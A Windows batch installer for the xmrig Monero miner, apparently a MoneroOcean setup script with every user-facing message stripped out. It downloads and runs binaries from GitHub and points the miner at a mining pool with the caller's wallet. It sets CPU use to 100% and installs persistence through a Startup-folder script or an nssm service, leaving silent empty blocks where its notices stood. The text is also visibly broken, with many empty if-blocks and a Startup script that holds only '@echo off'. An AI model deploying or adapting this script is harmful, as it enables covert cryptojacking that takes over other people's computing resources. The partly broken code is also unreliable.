@echo off

set VERSION=2.5

rem printing greetings



net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

rem command line arguments
set WALLET=%1
rem this one is optional
set EMAIL=%2

rem checking prerequisites

if [%WALLET%] == [] (
 
  exit /b 1
)

for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK

exit /b 1

:WALLET_LEN_OK

if ["%USERPROFILE%"] == [""] (
 
  exit /b 1
)

if not exist "%USERPROFILE%" (
 
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
 
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
 
  exit /b 1
)

where tasklist >NUL
if not %errorlevel% == 0 (
  
  exit /b 1
)

if %ADMIN% == 1 (
  where sc >NUL
  if not %errorlevel% == 0 (
    
    exit /b 1
  )
)

rem calculating port

set /a "EXP_MONERO_HASHRATE = %NUMBER_OF_PROCESSORS% * 700 / 1000"

if [%EXP_MONERO_HASHRATE%] == [] ( 
  
  exit 
)

if %EXP_MONERO_HASHRATE% gtr 8192 ( set PORT=18192 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 4096 ( set PORT=14096 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 2048 ( set PORT=12048 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 1024 ( set PORT=11024 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  512 ( set PORT=10512 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  256 ( set PORT=10256 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  128 ( set PORT=10128 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   64 ( set PORT=10064 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   32 ( set PORT=10032 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   16 ( set PORT=10016 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    8 ( set PORT=10008 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    4 ( set PORT=10004 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    2 ( set PORT=10002 & goto PORT_OK )
set PORT=10001

:PORT_OK

rem printing intentions

set "LOGFILE=%USERPROFILE%\moneroocean\xmrig.log"



if not [%EMAIL%] == [] (
  
)



if %ADMIN% == 0 (
  
) else (
  
)



pause

rem start doing stuff: preparing miner


sc stop moneroocean_miner
sc delete moneroocean_miner
taskkill /f /t /im xmrig.exe

:REMOVE_DIR0

timeout 5
rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0


powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  
  goto MINER_BAD
)


powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\moneroocean')"
if errorlevel 1 (
 
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    
    exit /b 1
  )
  
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\xmrig.zip" >NUL
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"


powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
"%USERPROFILE%\moneroocean\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK
:MINER_BAD

if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
  
) else (
  
)


for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"


powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  
  exit /b 1
)

:REMOVE_DIR1

timeout 5
rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR1


powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\moneroocean')"
if errorlevel 1 (
 
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    
    exit /b 1
  )
  
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\xmrig.zip" >NUL
  if errorlevel 1 (
    
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"


powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
"%USERPROFILE%\moneroocean\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK

if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
  
) else (
 
)

exit /b 1

:MINER_OK



for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
if [%PASS%] == [] (
  set PASS=na
)
if not [%EMAIL%] == [] (
  set "PASS=%PASS%:%EMAIL%"
)

powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
set LOGFILE2=%LOGFILE:\=\\%
powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 

copy /Y "%USERPROFILE%\moneroocean\config.json" "%USERPROFILE%\moneroocean\config_background.json" >NUL
powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config_background.json'" 

rem preparing script
(
echo @echo off
echo tasklist /fi "imagename eq xmrig.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /low %%~dp0xmrig.exe %%^*
echo goto EXIT
echo :ALREADY_RUNNING
echo echo Monero miner is already running in the background. Refusing to run another one.
echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner first.
echo :EXIT
) > "%USERPROFILE%\moneroocean\miner.bat"

rem preparing script background work and work under reboot

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK
)
if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK  
)


exit /b 1

:STARTUP_DIR_OK

(
echo @echo off

) > "%STARTUP_DIR%\moneroocean_miner.bat"


call "%STARTUP_DIR%\moneroocean_miner.bat"
goto OK

:ADMIN_MINER_SETUP


powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
if errorlevel 1 (
 
  exit /b 1
)


powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\moneroocean')"
if errorlevel 1 (
 
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
   
    exit /b 1
  )
 
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\nssm.zip" >NUL
  if errorlevel 1 (
   
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\nssm.zip"


sc stop moneroocean_miner
sc delete moneroocean_miner
"%USERPROFILE%\moneroocean\nssm.exe" install moneroocean_miner "%USERPROFILE%\moneroocean\xmrig.exe"
if errorlevel 1 (
  
  exit /b 1
)
"%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppDirectory "%USERPROFILE%\moneroocean"
"%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\moneroocean\stdout"
"%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\moneroocean\stderr"


"%USERPROFILE%\moneroocean\nssm.exe" start moneroocean_miner
if errorlevel 1 (
  
  exit /b 1
)


goto OK

:OK

pause
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b




